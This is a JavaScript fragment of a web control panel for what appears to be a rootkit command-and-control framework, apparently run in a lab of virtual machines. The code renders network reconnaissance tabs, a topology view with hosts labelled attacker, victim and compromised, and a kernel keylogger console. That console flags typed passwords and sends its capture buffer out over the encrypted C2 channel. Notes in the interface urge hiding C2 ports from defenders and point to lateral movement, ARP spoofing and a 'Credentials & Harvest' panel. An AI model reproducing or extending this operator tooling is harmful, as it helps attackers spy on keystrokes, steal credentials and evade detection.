  h+='</div>';
  h+='<div class="tabs">';
  [{k:'connections',l:'Connections ('+active.length+')'},{k:'listeners',l:'Listeners ('+listeners.length+')'},{k:'interfaces',l:'Interfaces'},{k:'routes',l:'Routes'},{k:'arp',l:'ARP Table'},{k:'dns',l:'DNS'},{k:'portscan',l:'Port Scan'},{k:'capture',l:'Capture'},{k:'topology',l:'Topology'}].forEach(t=>{h+='<div class="tab '+(S.netTab===t.k?'active':'')+'" onclick="S.netTab=\''+t.k+'\';renderPanel()">'+t.l+'</div>'});
  h+='</div>';
  if(S.netTab==='connections'){
    const estab=active.filter(c=>c.state==='ESTAB'||c.state==='ESTABLISHED');
    const tw=active.filter(c=>c.state==='TIME-WAIT'||c.state==='TIME_WAIT');
    const cw=active.filter(c=>c.state==='CLOSE-WAIT'||c.state==='CLOSE_WAIT');
    h+='<div style="display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap">';
    h+='<span class="badge" style="background:color-mix(in srgb,var(--green) 12%,transparent);color:var(--green);padding:3px 10px">ESTABLISHED: '+estab.length+'</span>';
    if(tw.length)h+='<span class="badge" style="background:color-mix(in srgb,var(--yellow) 12%,transparent);color:var(--yellow);padding:3px 10px">TIME_WAIT: '+tw.length+'</span>';
    if(cw.length)h+='<span class="badge" style="background:color-mix(in srgb,var(--orange) 12%,transparent);color:var(--orange);padding:3px 10px">CLOSE_WAIT: '+cw.length+'</span>';
    h+='</div>';
    if(active.length===0)h+='<div class="card" style="text-align:center;padding:32px;color:var(--t3)">No active connections. Click Refresh All to load.</div>';
    else{
      h+='<div class="card" style="padding:0;overflow:hidden"><div style="max-height:500px;overflow-y:auto"><table class="dtable"><thead><tr><th>Proto</th><th>Local Address</th><th>Remote Address</th><th>State</th><th>Service</th><th>Process</th></tr></thead><tbody>';
      active.forEach(c=>{
        const sc=stClr[c.state]||'var(--t3)';const svc=portSvc(c.local)||portSvc(c.remote);
        h+='<tr><td class="mono" style="text-transform:uppercase;font-size:11px;color:var(--cyan)">'+c.proto+'</td><td class="mono" style="font-size:11px">'+esc(c.local)+'</td><td class="mono" style="font-size:11px">'+esc(c.remote||'\u2014')+'</td><td><span class="badge" style="background:color-mix(in srgb,'+sc+' 15%,transparent);color:'+sc+'">'+c.state+'</span></td><td style="font-size:11px;color:var(--t2)">'+(svc||'<span style="color:var(--t4)">\u2014</span>')+'</td><td class="mono" style="font-size:10px;color:var(--t3)">'+esc(c.proc||'\u2014')+'</td></tr>';
      });
      h+='</tbody></table></div></div>';
    }
  }else if(S.netTab==='listeners'){
    if(listeners.length===0)h+='<div class="card" style="text-align:center;padding:32px;color:var(--t3)">No listeners found. Click Refresh All to load.</div>';
    else{
      h+='<div class="card" style="padding:0;overflow:hidden"><table class="dtable"><thead><tr><th>Proto</th><th>Listen Address</th><th>Port</th><th>Service</th><th>Process</th></tr></thead><tbody>';
      listeners.forEach(c=>{
        const pm=c.local.match(/:(\d+)$/);const port=pm?pm[1]:'';const svc=portSvc(c.local);
        const isC2=port==='9999'||port==='9998'||port==='8080';
        h+='<tr style="'+(isC2?'background:color-mix(in srgb,var(--red) 5%,transparent)':'')+'"><td class="mono" style="text-transform:uppercase;font-size:11px;color:var(--cyan)">'+c.proto+'</td><td class="mono" style="font-size:11px">'+esc(c.local)+'</td><td class="mono" style="font-size:12px;font-weight:600;color:'+(isC2?'var(--red)':'var(--t1)')+'">'+port+'</td><td style="font-size:11px">'+(isC2?'<span style="color:var(--red);font-weight:600">'+svc+' (C2)</span>':(svc||'<span style="color:var(--t4)">unknown</span>'))+'</td><td class="mono" style="font-size:10px;color:var(--t3)">'+esc(c.proc||'\u2014')+'</td></tr>';
      });
      h+='</tbody></table></div>';
      const c2Ports=listeners.filter(c=>{const m=c.local.match(/:(\d+)$/);return m&&['8080','9999','9998'].includes(m[1])});
      if(c2Ports.length)h+='<div class="card" style="padding:10px 14px;margin-top:12px;border-left:3px solid var(--red)"><div style="font-size:11px;font-weight:600;color:var(--red)">C2 Footprint Detected</div><div style="font-size:11px;color:var(--t3);margin-top:4px">'+c2Ports.length+' port(s) attributable to C2 infrastructure. These should be hidden from defenders via rootkit port hiding.</div></div>';
    }
  }else if(S.netTab==='interfaces'){
    if(ifaces.length===0)h+='<div class="card" style="text-align:center;padding:32px;color:var(--t3)">No interfaces found. Click Refresh All to load.</div>';
    else{
      h+='<div class="grid g2" style="margin-bottom:16px">';
      ifaces.forEach(i=>{
        const up=i.state==='UP'||i.state==='UNKNOWN';
        h+='<div class="card" style="padding:14px;border-left:3px solid '+(up?'var(--green)':'var(--t4)')+'">';
        h+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><span style="font-size:14px;font-weight:700;color:var(--t1)">'+esc(i.name)+'</span><span class="badge '+(up?'b-pass':'b-fail')+'">'+i.state+'</span></div>';
        h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:4px 16px;font-size:11px">';
        h+='<div><span style="color:var(--t4)">IP: </span><span class="mono" style="color:var(--cyan)">'+esc(i.ip||'N/A')+'</span></div>';
        h+='<div><span style="color:var(--t4)">MAC: </span><span class="mono">'+esc(i.mac||'N/A')+'</span></div>';
        h+='<div><span style="color:var(--t4)">MTU: </span><span class="mono">'+esc(i.mtu||'N/A')+'</span></div>';
        h+='<div><span style="color:var(--t4)">Type: </span><span>'+(i.name.startsWith('lo')?'Loopback':i.name.startsWith('eth')||i.name.startsWith('ens')?'Ethernet':i.name.startsWith('wl')?'WiFi':i.name.startsWith('vir')||i.name.startsWith('vnet')?'Virtual':i.name.startsWith('docker')||i.name.startsWith('br')?'Bridge':'Other')+'</span></div>';
        if(i.rxb||i.txb){
          h+='<div><span style="color:var(--t4)">RX: </span><span class="mono" style="color:var(--green)">'+fmtBytes(i.rxb)+'</span></div>';
          h+='<div><span style="color:var(--t4)">TX: </span><span class="mono" style="color:var(--blue)">'+fmtBytes(i.txb)+'</span></div>';
        }
        h+='</div></div>';
      });
      h+='</div>';
    }
  }else if(S.netTab==='routes'){
    h+='<div style="display:flex;justify-content:flex-end;margin-bottom:12px"><button class="btn btn-sm" onclick="refreshNetRoutes().then(()=>renderPanel())">'+I.refresh+' Refresh Routes</button></div>';
    if(routes.length===0)h+='<div class="card" style="text-align:center;padding:32px;color:var(--t3)">No routes loaded. Click Refresh Routes to load.</div>';
    else{
      const defRoute=routes.find(r=>r.dest==='default');
      if(defRoute)h+='<div class="card" style="padding:10px 14px;margin-bottom:12px;border-left:3px solid var(--blue)"><div style="font-size:11px;font-weight:600;color:var(--blue)">Default Gateway</div><div style="font-size:13px;color:var(--t1);margin-top:4px" class="mono">'+defRoute.gateway+' via '+defRoute.iface+'</div></div>';
      h+='<div class="card" style="padding:0;overflow:hidden"><table class="dtable"><thead><tr><th>Destination</th><th>Gateway</th><th>Interface</th><th>Metric</th><th>Scope</th></tr></thead><tbody>';
      routes.forEach(r=>{
        const isDef=r.dest==='default';
        h+='<tr style="'+(isDef?'background:color-mix(in srgb,var(--blue) 5%,transparent)':'')+'"><td class="mono" style="font-weight:'+(isDef?700:400)+';color:'+(isDef?'var(--blue)':'var(--t1)')+'">'+r.dest+'</td><td class="mono">'+r.gateway+'</td><td>'+r.iface+'</td><td class="mono">'+(r.metric||'\u2014')+'</td><td style="font-size:11px;color:var(--t3)">'+(r.scope||'\u2014')+'</td></tr>';
      });
      h+='</tbody></table></div>';
    }
  }else if(S.netTab==='arp'){
    h+='<div style="display:flex;justify-content:flex-end;margin-bottom:12px"><button class="btn btn-sm" onclick="refreshNetArp().then(()=>renderPanel())">'+I.refresh+' Refresh ARP</button></div>';
    if(arp.length===0)h+='<div class="card" style="text-align:center;padding:32px;color:var(--t3)">ARP table empty. Click Refresh ARP to load.</div>';
    else{
      h+='<div class="card" style="padding:0;overflow:hidden"><table class="dtable"><thead><tr><th>IP Address</th><th>MAC Address</th><th>Interface</th><th>State</th><th>Vendor</th></tr></thead><tbody>';
      arp.forEach(a=>{
        const stC=a.state==='REACHABLE'?'var(--green)':a.state==='STALE'?'var(--yellow)':a.state==='FAILED'?'var(--red)':'var(--t3)';
        const known=a.ip==='192.168.122.167'?'Attacker':a.ip==='192.168.122.146'?'Victim':a.ip==='192.168.122.1'?'Gateway':'';
        h+='<tr><td class="mono" style="font-weight:600;color:var(--t1)">'+a.ip+(known?' <span style="font-size:9px;color:var(--red);font-weight:400">('+known+')</span>':'')+'</td><td class="mono" style="font-size:11px">'+a.mac+'</td><td>'+a.iface+'</td><td><span class="badge" style="background:color-mix(in srgb,'+stC+' 15%,transparent);color:'+stC+'">'+a.state+'</span></td><td style="font-size:10px;color:var(--t3)">'+(a.mac.startsWith('52:54')?'QEMU/KVM':a.mac.startsWith('00:16:3e')?'Xen':'')+'</td></tr>';
      });
      h+='</tbody></table></div>';
      h+='<div class="card" style="padding:10px 14px;margin-top:12px;border-left:3px solid var(--yellow)"><div style="font-size:11px;font-weight:600;color:var(--yellow)">OPSEC Note</div><div style="font-size:11px;color:var(--t3);margin-top:4px">ARP table reveals network neighbors. Useful for lateral movement discovery and ARP spoofing attacks.</div></div>';
    }
  }else if(S.netTab==='dns'){
    h+='<div style="display:flex;justify-content:flex-end;margin-bottom:12px"><button class="btn btn-sm" onclick="refreshNetDns().then(()=>renderPanel())">'+I.refresh+' Refresh DNS</button></div>';
    h+='<div class="grid g2" style="margin-bottom:16px">';
    h+='<div class="card" style="padding:14px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:8px">DNS Resolvers (/etc/resolv.conf)</div>';
    if(dns.length===0)h+='<div style="color:var(--t3);font-size:11px">No DNS servers configured or not loaded.</div>';
    else dns.forEach((d,i)=>{h+='<div style="display:flex;align-items:center;gap:8px;padding:4px 0"><span class="badge b-info" style="font-size:9px;padding:1px 6px">#'+(i+1)+'</span><span class="mono" style="font-size:12px;color:var(--cyan)">'+d+'</span></div>'});
    h+='</div>';
    h+='<div class="card" style="padding:14px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:8px">DNS Lookup</div>';
    h+='<div style="display:flex;gap:8px"><input class="input" id="dnsLookup" placeholder="hostname or IP" style="flex:1" onkeydown="if(event.key===\'Enter\')doDnsLookup()"><button class="btn btn-sm btn-primary" onclick="doDnsLookup()">Resolve</button></div>';
    if(S.dnsResult)h+='<div class="mono" style="margin-top:8px;font-size:11px;color:var(--t2);white-space:pre-wrap;max-height:150px;overflow-y:auto;background:var(--bg-1);padding:8px;border-radius:4px">'+esc(S.dnsResult)+'</div>';
    h+='</div></div>';
    h+='<div class="card" style="padding:14px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:8px">Hostname & Domain</div>';
    h+='<div style="display:flex;gap:8px"><button class="btn btn-sm" onclick="apiExec(\'hostname -f 2>/dev/null;echo ---; cat /etc/hostname 2>/dev/null;echo ---; cat /etc/hosts 2>/dev/null\').then(r=>{S.hostInfo=r;renderPanel()})">Load Host Info</button></div>';
    if(S.hostInfo)h+='<div class="mono" style="margin-top:8px;font-size:11px;color:var(--t2);white-space:pre-wrap;max-height:200px;overflow-y:auto;background:var(--bg-1);padding:8px;border-radius:4px">'+esc(S.hostInfo)+'</div>';
    h+='</div>';
  }else if(S.netTab==='portscan'){
    h+='<div class="card"><div style="display:flex;gap:8px;align-items:flex-end;flex-wrap:wrap">';
    h+='<div><label style="font-size:11px;color:var(--t3);display:block;margin-bottom:4px">Target IP</label><input class="input" id="scanIP" value="'+esc(S.scanTarget)+'" onchange="S.scanTarget=this.value" style="width:200px"></div>';
    h+='<div><label style="font-size:11px;color:var(--t3);display:block;margin-bottom:4px">Ports</label><input class="input" id="scanPorts" value="'+esc(S.scanPorts)+'" onchange="S.scanPorts=this.value" style="width:200px" placeholder="1-1024 or 22,80,443"></div>';
    h+='<button class="btn btn-sm btn-primary" onclick="runPortScan()" '+(S.scanRunning?'disabled':'')+'>'+I.scan+(S.scanRunning?' Scanning...':' Scan')+'</button>';
    h+='<button class="btn btn-sm" onclick="runQuickScan()">Common Ports</button>';
    h+='</div></div>';
    if(S.scanResults.length>0){
      const openPorts=S.scanResults.filter(r=>r.state==='open');
      h+='<div style="margin-bottom:8px"><span class="badge b-pass" style="padding:3px 10px">Open: '+openPorts.length+'</span> <span class="badge b-fail" style="padding:3px 10px">Closed: '+(S.scanResults.length-openPorts.length)+'</span></div>';
      h+='<div class="card" style="padding:0;overflow:hidden"><table class="dtable"><thead><tr><th>Port</th><th>State</th><th>Service</th><th>Banner</th></tr></thead><tbody>';
      S.scanResults.forEach(r=>{
        h+='<tr><td class="mono" style="color:var(--cyan);font-weight:600">'+r.port+'</td><td><span class="badge '+(r.state==='open'?'b-pass':'b-fail')+'">'+r.state+'</span></td><td>'+esc(r.service)+'</td><td class="mono" style="font-size:10px;color:var(--t3)">'+esc(r.banner||'')+'</td></tr>';
      });
      h+='</tbody></table></div>';
    }
  }else if(S.netTab==='capture'){
    h+='<div class="card"><div style="display:flex;gap:8px;align-items:flex-end;flex-wrap:wrap">';
    h+='<div><label style="font-size:11px;color:var(--t3);display:block;margin-bottom:4px">Interface</label><select class="input" id="sniffIf" onchange="S.sniffIface=this.value" style="width:140px">';
    ifaces.forEach(i=>{h+='<option value="'+i.name+'"'+(S.sniffIface===i.name?' selected':'')+'>'+i.name+'</option>'});
    if(ifaces.length===0)h+='<option value="'+esc(S.sniffIface)+'">'+esc(S.sniffIface)+'</option>';
    h+='</select></div>';
    h+='<div><label style="font-size:11px;color:var(--t3);display:block;margin-bottom:4px">Packet Count</label><input class="input" type="number" id="sniffN" value="'+S.sniffCount+'" onchange="S.sniffCount=parseInt(this.value)||50" style="width:80px"></div>';
    h+='<div><label style="font-size:11px;color:var(--t3);display:block;margin-bottom:4px">Filter (BPF)</label><input class="input" id="sniffFilter" placeholder="e.g. port 22, host 10.0.0.1" value="'+esc(S.sniffFilter||'')+'" onchange="S.sniffFilter=this.value" style="width:200px"></div>';
    h+='<button class="btn btn-sm '+(S.sniffRunning?'btn-danger':'btn-primary')+'" onclick="'+(S.sniffRunning?'stopSniff()':'startSniff()')+'">'+(S.sniffRunning?I.stop+' Stop':I.play+' Capture')+'</button>';
    h+='<button class="btn btn-sm" onclick="S.sniffData=[];renderPanel()">'+I.trash+' Clear</button>';
    h+='</div></div>';
    if(S.sniffData.length>0){
      h+='<div style="margin-bottom:8px;font-size:11px;color:var(--t3)">'+S.sniffData.length+' packets captured</div>';
      h+='<div class="card" style="padding:0;overflow:hidden"><div style="max-height:400px;overflow-y:auto"><table class="dtable"><thead><tr><th style="width:50px">#</th><th>Source</th><th>Destination</th><th>Proto</th><th>Info</th></tr></thead><tbody>';
      S.sniffData.forEach((p,i)=>{
        h+='<tr><td class="mono" style="font-size:10px;color:var(--t4)">'+i+'</td><td class="mono" style="font-size:11px;color:var(--cyan)">'+esc(p.src)+'</td><td class="mono" style="font-size:11px">'+esc(p.dst)+'</td><td><span class="badge b-info">'+esc(p.proto)+'</span></td><td style="font-size:11px;color:var(--t3)">'+esc(p.info)+'</td></tr>';
      });
      h+='</tbody></table></div></div>';
    }
  }else if(S.netTab==='topology'){
    h+='<div style="display:flex;justify-content:flex-end;margin-bottom:12px"><button class="btn btn-sm" onclick="topoScan()"'+(S.topoScan?' disabled':'')+'>'+I.search+(S.topoScan?' Scanning...':' ARP Scan')+'</button></div>';
    h+='<div class="card" style="margin-bottom:16px;padding:24px;text-align:center;overflow-x:auto">';
    h+='<svg width="700" height="320" viewBox="0 0 700 320" style="margin:0 auto;display:block">';
    const nodes=[{x:350,y:50,host:S.topoHosts[0],c:'var(--blue)'},{x:150,y:200,host:S.topoHosts[1],c:'var(--red)'},{x:550,y:200,host:S.topoHosts[2],c:'var(--green)'}];
    h+='<line x1="350" y1="80" x2="150" y2="180" stroke="var(--border-l)" stroke-width="2" stroke-dasharray="6"/>';
    h+='<line x1="350" y1="80" x2="550" y2="180" stroke="var(--border-l)" stroke-width="2" stroke-dasharray="6"/>';
    h+='<line x1="150" y1="200" x2="550" y2="200" stroke="var(--red)" stroke-width="2"><animate attributeName="stroke-opacity" values="1;.3;1" dur="2s" repeatCount="indefinite"/></line>';
    h+='<text x="350" y="205" fill="var(--red)" font-size="9" text-anchor="middle" font-family="var(--font-mono)">C2 Channel (encrypted)</text>';
    nodes.forEach(n=>{
      const comp=n.host.status==='compromised';
      h+='<g>';
      if(comp)h+='<circle cx="'+n.x+'" cy="'+n.y+'" r="34" fill="none" stroke="var(--red)" stroke-width="1" stroke-dasharray="4"><animate attributeName="r" values="34;38;34" dur="2s" repeatCount="indefinite"/><animate attributeName="stroke-opacity" values="1;.3;1" dur="2s" repeatCount="indefinite"/></circle>';
      h+='<circle cx="'+n.x+'" cy="'+n.y+'" r="28" fill="var(--bg-2)" stroke="'+n.c+'" stroke-width="2"/>';
      const icon=n.host.type==='router'?'\u25C8':n.host.type==='attacker'?'\u2620':'\u2731';
      h+='<text x="'+n.x+'" y="'+(n.y+5)+'" fill="'+n.c+'" font-size="18" text-anchor="middle">'+icon+'</text>';
      h+='<text x="'+n.x+'" y="'+(n.y+48)+'" fill="var(--t1)" font-size="11" text-anchor="middle" font-weight="600">'+n.host.hostname+'</text>';
      h+='<text x="'+n.x+'" y="'+(n.y+62)+'" fill="var(--t3)" font-size="10" text-anchor="middle" font-family="var(--font-mono)">'+n.host.ip+'</text>';
      h+='<text x="'+n.x+'" y="'+(n.y+76)+'" fill="var(--t4)" font-size="9" text-anchor="middle">'+n.host.os+'</text>';
      if(comp)h+='<text x="'+(n.x+32)+'" y="'+(n.y-20)+'" fill="var(--red)" font-size="8" font-weight="600">COMPROMISED</text>';
      h+='</g>';
    });
    h+='</svg></div>';
    h+='<div class="card" style="padding:0;overflow:hidden"><div style="padding:10px 16px;border-bottom:1px solid var(--border);font-size:13px;font-weight:600;color:var(--t1)">Discovered Hosts ('+S.topoHosts.length+')</div>';
    h+='<table class="dtable"><thead><tr><th>IP Address</th><th>Hostname</th><th>Type</th><th>OS</th><th>Open Ports</th><th>Status</th></tr></thead><tbody>';
    S.topoHosts.forEach(host=>{
      const stBadge=host.status==='compromised'?'b-critical':host.status==='up'?'b-pass':'b-fail';
      h+='<tr><td class="mono" style="font-weight:600">'+host.ip+'</td><td>'+host.hostname+'</td><td style="color:var(--'+(host.type==='attacker'?'red':host.type==='router'?'blue':'t2')+')">'+host.type+'</td><td style="font-size:11px;color:var(--t3)">'+host.os+'</td><td class="mono" style="font-size:11px">'+host.ports.join(', ')+'</td><td><span class="badge '+stBadge+'">'+host.status.toUpperCase()+'</span></td></tr>';
    });
    h+='</tbody></table></div>';
  }
  return h;
};

/* ===== KEYLOGGER ===== */
panels.keylogger=function(){
  const creds=S.klData.filter(e=>e.cred);
  const privCmds=S.klData.filter(e=>e.priv);
  let h='<div class="panel-hdr"><div><div class="panel-title">Keystroke Logger</div><div class="panel-sub">Kernel-level TTY/PTY sniffer via ftrace syscall hook</div></div><div class="panel-actions">';
  h+='<span class="badge '+(S.klActive?'b-pass':'b-fail')+'" style="padding:5px 14px;font-size:11px">'+(S.klActive?'RECORDING':'STOPPED')+'</span>';
  h+='<button class="btn btn-sm btn-success" onclick="klAction(\'start\')" '+(S.klActive?'disabled':'')+'>'+I.play+' Start</button>';
  h+='<button class="btn btn-sm btn-danger" onclick="klAction(\'stop\')" '+(!S.klActive?'disabled':'')+'>'+I.stop+' Stop</button>';
  h+='<button class="btn btn-sm" onclick="klAction(\'dump\')">'+I.download+' Dump</button>';
  h+='<button class="btn btn-sm" onclick="klExport()" '+(S.klData.length===0?'disabled':'')+'>'+I.download+' Export</button>';
  h+='<div class="toggle-wrap" style="margin-left:8px"><span style="font-size:11px;color:var(--t3)">Auto-dump (5s)</span><label class="toggle"><input type="checkbox" '+(S.klAuto?'checked':'')+' onchange="S.klAuto=this.checked"><span class="toggle-slider"></span></label></div>';
  h+='</div></div>';
  h+='<div class="grid g4" style="margin-bottom:16px">';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Captures</div><div style="font-size:22px;font-weight:700;color:var(--green)">'+S.klData.length+'</div><div style="font-size:10px;color:var(--t3)">'+S.klDumps.length+' dumps</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Data Size</div><div style="font-size:22px;font-weight:700;color:var(--cyan)">'+S.klTotalBytes+'</div><div style="font-size:10px;color:var(--t3)">bytes captured</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Credentials</div><div style="font-size:22px;font-weight:700;color:'+(creds.length>0?'var(--red)':'var(--t4)')+'">'+creds.length+'</div><div style="font-size:10px;color:var(--t3)">password hints</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Priv Commands</div><div style="font-size:22px;font-weight:700;color:'+(privCmds.length>0?'var(--yellow)':'var(--t4)')+'">'+privCmds.length+'</div><div style="font-size:10px;color:var(--t3)">sudo/su/ssh</div></div>';
  h+='</div>';
  h+='<div class="tabs" style="margin-bottom:16px">';
  [{k:'live',l:'Live Feed ('+S.klData.length+')'},{k:'raw',l:'Raw Buffer'},{k:'creds',l:'Credentials ('+creds.length+')'},{k:'info',l:'Hook Info'}].forEach(t=>{h+='<div class="tab '+(S.klTab===t.k?'active':'')+'" onclick="S.klTab=\''+t.k+'\';renderPanel()">'+t.l+'</div>'});
  h+='</div>';
  if(S.klTab==='live'){
    h+='<div style="display:flex;gap:8px;margin-bottom:12px"><input class="input" placeholder="Search keystrokes..." value="'+esc(S.klSearch)+'" oninput="S.klSearch=this.value;renderPanel()" style="flex:1"><button class="btn btn-sm" onclick="S.klData=[];S.klDumps=[];S.klTotalBytes=0;renderPanel()">'+I.trash+' Clear All</button></div>';
    const filt=S.klSearch.toLowerCase();
    const filtered=filt?S.klData.filter(e=>e.keys.toLowerCase().includes(filt)):S.klData;
    if(filtered.length===0)h+='<div class="card" style="text-align:center;padding:40px;color:var(--t3)">'+(S.klActive?'Keylogger running. Click <b>Dump</b> to fetch captured keystrokes from kernel buffer.':'No captures yet. Click <b>Start</b> to activate the kernel keylogger, then <b>Dump</b> to fetch data.')+'</div>';
    else{
      h+='<div class="card" style="padding:0;overflow:hidden"><div class="keylog-body" style="max-height:450px;overflow-y:auto;padding:0">';
      filtered.slice().reverse().forEach((entry,i)=>{
        const isPw=entry.cred;const isPriv=entry.priv;
        h+='<div class="kl-line" style="'+(isPw?'background:color-mix(in srgb,var(--red) 6%,transparent);':'')+(isPriv&&!isPw?'background:color-mix(in srgb,var(--yellow) 6%,transparent);':'')+'">';
        h+='<span class="kl-time">'+entry.time+'</span>';
        h+='<span class="kl-session" style="'+(entry.session==='tty'?'color:var(--cyan)':'')+'">'+esc(entry.session)+'</span>';
        h+='<span class="kl-keys'+(isPw?' kl-sensitive':'')+'">'+esc(entry.keys)+'</span>';
        if(isPw)h+='<span class="badge b-critical" style="font-size:8px;padding:1px 6px">CREDENTIAL</span>';
        if(isPriv&&!isPw)h+='<span class="badge b-high" style="font-size:8px;padding:1px 6px">PRIV_CMD</span>';
        h+='</div>';
      });
      h+='</div></div>';
    }
  }else if(S.klTab==='raw'){
    h+='<div style="display:flex;justify-content:flex-end;margin-bottom:8px"><button class="btn btn-sm" onclick="klAction(\'dump\')">'+I.download+' Dump Now</button></div>';
    if(S.klDumps.length===0)h+='<div class="card" style="text-align:center;padding:40px;color:var(--t3)">No raw dumps yet. Click Dump to fetch the kernel ring buffer.</div>';
    else{
      S.klDumps.slice().reverse().forEach((d,i)=>{
        h+='<div class="card" style="padding:0;overflow:hidden;margin-bottom:12px"><div style="padding:8px 14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;background:var(--bg-2)"><span style="font-size:11px;font-weight:600;color:var(--t1)">Dump #'+(S.klDumps.length-i)+' - '+d.time+'</span><span style="font-size:10px;color:var(--t3)">'+d.bytes+' bytes / '+d.lines.length+' lines</span></div>';
        h+='<div class="keylog" style="max-height:300px;font-size:11px;line-height:1.6;white-space:pre-wrap;word-break:break-all;padding:12px">';
        h+=esc(d.raw);
        h+='</div></div>';
      });
    }
  }else if(S.klTab==='creds'){
    if(creds.length===0)h+='<div class="card" style="text-align:center;padding:40px;color:var(--t3)">No credential-related keystrokes captured yet. The keylogger flags lines containing password, secret, token, login, sudo, su, ssh patterns.</div>';
    else{
      h+='<div class="card" style="padding:10px 14px;margin-bottom:12px;border-left:3px solid var(--red)"><div style="font-size:11px;font-weight:600;color:var(--red)">Credential Intelligence</div><div style="font-size:11px;color:var(--t3);margin-top:4px">These lines were flagged because they contain password/credential patterns. Review for plaintext passwords typed by users.</div></div>';
      h+='<div class="card" style="padding:0;overflow:hidden"><table class="dtable"><thead><tr><th style="width:140px">Time</th><th>Captured Input</th><th>Pattern</th></tr></thead><tbody>';
      creds.slice().reverse().forEach(e=>{
        let pat='';
        if(e.keys.match(/sudo/i))pat='sudo';else if(e.keys.match(/su\s/i))pat='su';else if(e.keys.match(/ssh/i))pat='ssh';else if(e.keys.match(/pass/i))pat='password';else if(e.keys.match(/token/i))pat='token';else if(e.keys.match(/secret/i))pat='secret';else if(e.keys.match(/login/i))pat='login';else pat='keyword';
        h+='<tr><td class="mono" style="font-size:10px;color:var(--t3)">'+e.time+'</td><td class="mono" style="color:var(--red);font-size:12px">'+esc(e.keys)+'</td><td><span class="badge b-critical" style="font-size:9px">'+pat+'</span></td></tr>';
      });
      h+='</tbody></table></div>';
    }
  }else if(S.klTab==='info'){
    h+='<div class="grid g2" style="margin-bottom:16px">';
    h+='<div class="card" style="padding:14px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:10px">Collection Method</div>';
    h+='<div style="font-size:11px;color:var(--t2);line-height:1.8">';
    h+='<div style="margin-bottom:6px">Dual-source kernel keylogger:</div>';
    h+='<div style="padding-left:12px;border-left:2px solid var(--cyan);margin-bottom:8px">';
    h+='<div><span style="color:var(--cyan);font-weight:600">1. Ftrace sys_read hook</span></div>';
    h+='<div style="color:var(--t3)">Intercepts <span class="mono" style="color:var(--cyan)">__x64_sys_read()</span> syscall</div>';
    h+='<div style="color:var(--t3)">Filters character devices: major <span class="mono" style="color:var(--yellow)">4</span> (/dev/ttyN) + major <span class="mono" style="color:var(--yellow)">136</span> (/dev/pts/N)</div>';
    h+='<div style="color:var(--t3)">Captures printable ASCII (0x20-0x7e), newlines, handles backspace</div>';
    h+='</div>';
    h+='<div style="padding-left:12px;border-left:2px solid var(--green);margin-bottom:8px">';
    h+='<div><span style="color:var(--green);font-weight:600">2. Keyboard notifier</span></div>';
    h+='<div style="color:var(--t3)">Registers via <span class="mono" style="color:var(--green)">register_keyboard_notifier()</span></div>';
    h+='<div style="color:var(--t3)">Catches raw keypress events at kernel input layer</div>';
    h+='<div style="color:var(--t3)">Works even on local console (no PTY required)</div>';
    h+='</div>';
    h+='</div></div>';
    h+='<div class="card" style="padding:14px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:10px">Buffer & Protocol</div>';
    h+='<div style="font-size:11px;color:var(--t2);line-height:1.8">';
    h+='<div style="display:grid;grid-template-columns:auto 1fr;gap:4px 12px">';
    h+='<span style="color:var(--t4)">Ring buffer:</span><span class="mono">4096 bytes (wraps on overflow)</span>';
    h+='<span style="color:var(--t4)">Lock:</span><span class="mono">spinlock_t (IRQ-safe)</span>';
    h+='<span style="color:var(--t4)">Protocol:</span><span class="mono">KEYLOG_START / STOP / DUMP / STATUS</span>';
    h+='<span style="color:var(--t4)">Transport:</span><span class="mono">ChaCha20-Poly1305 encrypted C2 channel</span>';
    h+='<span style="color:var(--t4)">Exfil:</span><span class="mono">Dump buffer over C2, then clear</span>';
    h+='<span style="color:var(--t4)">Captures:</span><span class="mono">SSH sessions, local console, su/sudo</span>';
    h+='<span style="color:var(--t4)">Evasion:</span><span class="mono">No /proc entry, no userspace agent</span>';
    h+='<span style="color:var(--t4)">MITRE:</span><span class="mono">T1056.001 - Input Capture: Keylogging</span>';
    h+='</div></div></div>';
    h+='</div>';
    h+='<div class="card" style="padding:14px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:10px">Rootkit Keylogger Status Check</div>';
    h+='<div style="display:flex;gap:8px;align-items:center"><button class="btn btn-sm" onclick="klAction(\'status\')">'+I.refresh+' Query Status</button><span style="font-size:12px;color:'+(S.klActive?'var(--green)':'var(--red)')+'">Keylogger is '+(S.klActive?'ACTIVE':'INACTIVE')+'</span></div></div>';
  }
  return h;
};

/* ===== CREDENTIALS & HARVEST ===== */
panels.credentials=function(){
  const loadedCount=Object.values(S.credsLoaded).filter(v=>v===true).length;
  const harvestDone=Object.values(S.harvestResults).filter(v=>v&&v.data).length;
  const harvestTotal=Object.keys(HARVEST_CMDS).length;
  let h='<div class="panel-hdr"><div><div class="panel-title">Credentials &amp; Harvest</div><div class="panel-sub">Post-exploitation recon — extract secrets, find privesc vectors, map the target</div></div><div class="panel-actions">';
  if(S.credTab==='recon')h+='<button class="btn btn-sm btn-primary" onclick="loadAllCreds()" '+(S.credsLoading?'disabled':'')+'>'+I.download+(S.credsLoading?' Loading...':' Load All')+'</button>';
  else h+='<button class="btn btn-sm btn-danger" onclick="harvestAll()" '+(S.harvestRunning?'disabled':'')+'>'+I.harvest+(S.harvestRunning?' Harvesting...':' Harvest All ('+harvestTotal+')')+'</button>';
  h+='</div></div>';
  h+='<div class="grid g4" style="margin-bottom:16px">';
